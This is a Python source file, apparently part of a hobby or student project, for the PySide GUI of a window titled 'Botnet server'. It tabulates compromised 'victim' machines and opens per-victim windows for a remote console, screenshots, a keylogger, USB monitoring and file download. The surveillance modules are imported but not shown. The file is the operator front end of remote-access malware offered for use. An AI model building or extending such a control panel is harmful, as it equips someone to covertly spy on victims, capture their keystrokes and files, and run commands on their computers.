__author__ = 'Administrator'

import sys,os
import math
from PySide.QtGui import *
from PySide.QtCore import Slot,SIGNAL,Qt
from server import server
from GUI_cmd import GUI_cmd
from GUI_screenshot import GUI_screenshot
from GUI_usb import GUI_usb
from GUI_keylogger import GUI_keylogger
from GUI_file import GUI_file

class CustomWidget(QWidget):

    sockList = []
    
    def __init__(self):
        QWidget.__init__(self)

    def redrawWidget(self,sockList):
        self.sockList = sockList
        self.update()
    
    def paintEvent(self, ev):
        p = QPainter(self)
        #p.fillRect(self.rect(), QBrush(Qt.red, Qt.Dense2Pattern))
        #p.drawText(self.rect(), Qt.AlignLeft | Qt.AlignVCenter, str(number))
        
        ##attacker
        pm = QPixmap(QImage('icons/h2.png'))
        x,y = (self.width()/2,self.height()/2)
        x = x-50
        y = y-50
        w = 64
        h = 64
        p.drawPixmap(x,y,w,h,pm)

        n = len(self.sockList) 
        
        if n == 0:
            return
        
        r = 100
        angle = 0
        diff = 360/n
        for i in range(n):
            ##victim-machine
            
            new_x = x + int(r*math.cos(math.radians(angle))) 
            new_y = y + int(r*math.sin(math.radians(angle)))
            new_w = 64
            new_h = 64
            #print i,x,y,'--->',angle,new_x,new_y,new_w,new_h

            pm = QPixmap(QImage('icons/v2.png'))
            p.drawPixmap(new_x,new_y,new_w,new_h,pm)
            ##connect with line
            p.drawLine(x+(w/2),y+(h/2),new_x+(new_w/2),new_y+(new_h/2))
            ## draw ip-address
            p.setPen(QColor(0, 0, 255))
            font = QFont('Arial',10,QFont.Bold)
            p.setFont(font)
            p.drawText(new_x,new_y-10, str(self.sockList[0][0]))
            angle = angle + diff
        


class MainGui:

    sockList = []
    ref_gui_usb = dict()
    ref_gui_keylogger = dict()
    
    def __init__(self):
        print 'gui constructor called....'
        self.serverInstance = None
        

    def open(self):

        # create app
        app = QApplication(sys.argv)

        # create frame object
        self.frame = QWidget()
        self.frame.setWindowTitle('Botnet server')
        self.frame.setWindowIcon(QIcon('icons/hacker.jpg'))
        self.frame.setMinimumSize(1250,650)

        #create mainLayout
        mainLayout = QVBoxLayout()
        self.frame.setLayout(mainLayout)


        #create center Panel
        #center panel -> left panel, rightButtonPanel
        self.createCenterPanel()
        mainLayout.addWidget(self.centerPanel)


        # create status/logging Panel
        self.createLoggingPanel()
        mainLayout.addWidget(self.logPanel)
    
        # execute app
        self.frame.showMaximized()

                           
        app.exec_()



    def createCenterPanel(self):

        self.centerPanel = QWidget()
        gridLayout = QGridLayout()

        ###tabbedPane
        self.tabbedPane = QTabWidget()

        #tab1:tabular view
        self.tabTable = QWidget()
        #table
        self.tableWidget = QTableWidget(0, 6)
        self.tableWidget.setEditTriggers(False)
        self.tableWidget.setSelectionMode(QAbstractItemView.SingleSelection)
        self.tableWidget.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        colHeader1 = QTableWidgetItem('Connection#')
        colHeader2 = QTableWidgetItem('PC-Name')
        colHeader3 = QTableWidgetItem('IP-address')
        colHeader4 = QTableWidgetItem('port-no')
        colHeader5 = QTableWidgetItem('USB-status')
        colHeader6 = QTableWidgetItem('Keylogging-status')
        self.tableWidget.setColumnWidth(0,100)
        self.tableWidget.setColumnWidth(1,200)
        self.tableWidget.setColumnWidth(2,200)
        self.tableWidget.setColumnWidth(3,100)
        self.tableWidget.setColumnWidth(4,100)
        self.tableWidget.setColumnWidth(5,150)
        self.tableWidget.setHorizontalHeaderItem(0,colHeader1)
        self.tableWidget.setHorizontalHeaderItem(1,colHeader2)
        self.tableWidget.setHorizontalHeaderItem(2,colHeader3)
        self.tableWidget.setHorizontalHeaderItem(3,colHeader4)
        self.tableWidget.setHorizontalHeaderItem(4,colHeader5)
        self.tableWidget.setHorizontalHeaderItem(5,colHeader6)
        self.tableWidget.itemSelectionChanged.connect(self.tableRowSelected)
        hll = QHBoxLayout()
        hll.addWidget(self.tableWidget)
        self.tabTable.setLayout(hll)
        self.tabbedPane.addTab(self.tabTable,'Tabular-View')
        #tab1:graph view
        self.tabGraph = CustomWidget()
        self.tabbedPane.addTab(self.tabGraph,'Graph-View')

        gridLayout.addWidget(self.tabbedPane,0,0)


        g1 = QGridLayout()

        buttonContainer1 = QGroupBox('')
        self.setColor(buttonContainer1,169, 186, 188)
        buttonContainer1.setMaximumHeight(200)
        vlayout = QVBoxLayout()
        #button-1
        if self.serverInstance == None:
            self.serverInstance = server(self,self.tableWidget)
        
        button1 = QPushButton('Start Server')
        button1.clicked.connect(self.serverInstance.startServer)
        button1.setMinimumHeight(40)
        vlayout.addWidget(button1)
        #button-2
        button2 = QPushButton('Stop Server')
        button2.clicked.connect(self.serverInstance.stopServer)
        button2.setMinimumHeight(40)
        vlayout.addWidget(button2)
        #button-3
        button3 = QPushButton('Exit')
        button3.setMinimumHeight(40)
        button3.clicked.connect(self.exit)
        vlayout.addWidget(button3)
        buttonContainer1.setLayout(vlayout)
        g1.addWidget(buttonContainer1,0,0)


        ##right button-option (commands)
        self.controls = QGroupBox()
        self.controls.setMinimumWidth(300)
        self.controls.setMaximumHeight(250)
        self.setColor(self.controls,150, 182, 234)
        v1 = QVBoxLayout()
        self.button1 = QPushButton('Console')
        self.button1.clicked.connect(self.openConsoleWindow)
        self.button1.setEnabled(False)
        self.button1.setMinimumHeight(40)
        v1.addWidget(self.button1)
        #button-2
        self.button2 = QPushButton('Screenshot')
        self.button2.clicked.connect(self.openScreenshotWindow)
        self.button2.setEnabled(False)
        self.button2.setMinimumHeight(40)
        v1.addWidget(self.button2)
        #button-3
        #button3 = QPushButton('Keylogger-Start')
        #button3.setMinimumHeight(40)
        #v1.addWidget(button3)
        #button-4
        self.button4 = QPushButton('Keylogger')
        self.button4.clicked.connect(self.openKeyloggerWindow)
        self.button4.setEnabled(False)
        self.button4.setMinimumHeight(40)
        v1.addWidget(self.button4)
        #button-5
        self.button5 = QPushButton('USB-monitor')
        self.button5.setMinimumHeight(40)
        self.button5.clicked.connect(self.openUSBWindow)
        self.button5.setEnabled(False)
        v1.addWidget(self.button5)
        #button-6
        self.button6 = QPushButton('File-Download')
        self.button6.setMinimumHeight(40)
        self.button6.clicked.connect(self.openFileDownloadWindow)
        self.button6.setEnabled(False)
        v1.addWidget(self.button6)
        #button-7
        #self.button7 = QPushButton('Close Connection')
        #self.button7.setMinimumHeight(40)
        #self.button7.clicked.connect(self.openFileDownloadWindow)
        #self.button7.setEnabled(False)
        #v1.addWidget(self.button7)
        
        self.controls.setLayout(v1)
        
        g1.addWidget(self.controls,1,0)
        gridLayout.addLayout(g1,0,1)
        self.centerPanel.setLayout(gridLayout)


    def tableRowSelected(self):

        ll = self.tableWidget.selectedItems()
        if len(ll) > 0:
            self.button1.setEnabled(True)
            self.button2.setEnabled(True)
            self.button4.setEnabled(True)
            self.button5.setEnabled(True)
            self.button6.setEnabled(True)
        else:
            self.button1.setEnabled(False)
            self.button2.setEnabled(False)
            self.button4.setEnabled(False)
            self.button5.setEnabled(False)
            self.button6.setEnabled(False)
            
            
    def openFileDownloadWindow(self):
        if len(self.sockList) > 0:
            row = self.tableWidget.selectedIndexes()[0].row()
            GUI_file().openDialog(self.frame,self.sockList[row][1],self.tableWidget)
        else:
            print 'sock list is empty'


    def openConsoleWindow(self):
        if len(self.sockList) > 0:
            row = self.tableWidget.selectedIndexes()[0].row()
            GUI_cmd().openDialog(self.frame,self.sockList[row][1],self.tableWidget)
        else:
            print 'sock list is empty'


    def openScreenshotWindow(self):
        if len(self.sockList) > 0:
            row = self.tableWidget.selectedIndexes()[0].row()
            GUI_screenshot().openDialog(self.frame,self.sockList[row][1],self.tableWidget)
        else:
            print 'sock list is empty'


    def openKeyloggerWindow(self):
        if len(self.sockList) > 0:
            row = self.tableWidget.selectedIndexes()[0].row()
            if row not in self.ref_gui_keylogger:
                self.ref_gui_keylogger[row] = GUI_keylogger()
            self.ref_gui_keylogger[row].openDialog(self.frame,self.sockList[row][1],self.tableWidget)
        else:
            print 'sock list is empty'


    def openUSBWindow(self):
        if len(self.sockList) > 0:
            row = self.tableWidget.selectedIndexes()[0].row()
            if row not in self.ref_gui_usb:
                self.ref_gui_usb[row] = GUI_usb()
            self.ref_gui_usb[row].openDialog(self.frame,self.sockList[row][1],self.tableWidget)
        else:
            print 'sock list is empty'
            

    def createLoggingPanel(self):

        self.logPanel = QFrame()
        self.logPanel.setMinimumHeight(150)
        self.logPanel.setMaximumHeight(150)
        self.setColor(self.logPanel,169, 186, 188)
        h1 = QHBoxLayout()

        self.labelStatus = QTextEdit('')
        #self.setColor(self.labelStatus,10,10,10)
        #self.labelStatus.setTextBackgroundColor(QColor(0,0,0))
        #self.labelStatus.setTextColor(QColor(255,255,255))
        self.labelStatus.setText('Application Started....')
        self.labelStatus.setReadOnly(True)
        font = QFont('Arial',9,QFont.Normal)
        self.labelStatus.setFont(font)
        self.labelStatus.setAlignment(Qt.AlignTop)
        h1.addWidget(self.labelStatus)
        
        self.logPanel.setLayout(h1)

        ####
        ##add statusLabel refeence to server class
        self.serverInstance.addStatusLabel(self.labelStatus)
        #self.labelStatus.append("hello")


    def redrawGraphTab(self,sockList):
        self.sockList = sockList
        self.tabGraph.redrawWidget(sockList)
        

####################################################3
    def setColor(self,widget,R,G,B):

         p = widget.palette()
         p.setColor(widget.backgroundRole(),QColor(R,G,B))
         widget.setAutoFillBackground(True)
         widget.setPalette(p)


    @Slot()
    def exit(self):
        # exit the application
        sys.exit(1)
